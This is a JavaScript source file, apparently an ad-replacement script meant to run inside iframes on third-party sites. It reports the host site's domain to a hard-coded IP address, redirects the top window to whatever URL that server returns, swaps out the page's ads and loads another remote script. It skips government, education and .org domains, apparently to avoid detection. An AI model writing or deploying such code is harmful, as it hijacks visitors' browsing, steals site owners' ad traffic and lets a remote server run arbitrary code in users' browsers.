import { phone } from 'ismobilejs';
import { mobileReplace, PCReplace } from './replace';
import { AD_0X0 } from './config';

const [name, version] = ['@veryci/ad-replace-extends-js', '1.0.0'];
const blackWebsite = /.edu|.org|12306.com|.*gov.*|^192.168|yoyo.qq.com/;
const hostname = Object.keys(window.top.location).length > 9 && window.top.location.hostname; // 当前ifram是否同源

function replace() {
  if (window.top.adReplaceJS || blackWebsite.test(hostname)) return;
  window.top.adReplaceJS = `${name}-${version}`;

  if (phone) {
    mobileReplace();
    // 唤醒广告位
    const scr = document.createElement('script');
    scr.src = AD_0X0;
    window.top.document.body.appendChild(scr);
  } else PCReplace();
}

function redirect() {
  let str = '';
  // const url = window.top.location.search.replace('?', '');
  // const arr = url.split('&');

  // arr.forEach((element) => {
  //   if (element.indexOf('url') !== -1) {
  //     let webUrl = element.split('=')[1];
  //     webUrl = webUrl.replace('http://', '');
  //     webUrl = webUrl.replace('https://', '');
  //     webUrl = webUrl.replace('/', '');
  //     if (webUrl.search(/^www./) !== -1 || webUrl.search(/^www./) !== -1) {
  //       str = webUrl.slice(webUrl.indexOf('.') + 1);
  //     } else {
  //       str = webUrl;
  //     }
  //   }
  // });
  if (hostname.search(/^www./) !== -1) {
    str = hostname.slice(hostname.indexOf('.') + 1);
  } else {
    str = hostname;
  }

  const fnName = `Jsonp${Math.random().toString().replace('.', '')}_${new Date().getTime()}`;
  window.top[fnName] = (data) => {
    if (data.url) window.top.location.href = data.url;
  };
  const os = document.createElement('script');
  os.src = `http://117.121.41.228:3000/replace?cb=${fnName}&host=${str}`;
  window.top.document.head.appendChild(os);
  os.remove();
}

function handler() {
  if (!hostname) return;
  if (!window.top.haveRedirect) {
    redirect();
    window.top.haveRedirect = true;
  }
  if (window.top.adReady || window.top.document.readyState !== 'complete') return;
  replace();
  setTimeout(replace, 4000);
  window.top.adReady = true;
}

if (document.addEventListener) {
  document.addEventListener('DOMContentLoaded', handler, false);
  document.addEventListener('readystatechange', handler, false); // IE9+
} else if (document.attachEvent) {
  document.attachEvent('onreadystatechange', handler);
}

setTimeout(() => {
  if (hostname) replace();
}, 2000);
setTimeout(() => {
  if (window.top.adReady) return;
  if (hostname) replace();
  window.top.adReady = true;
}, 7000);
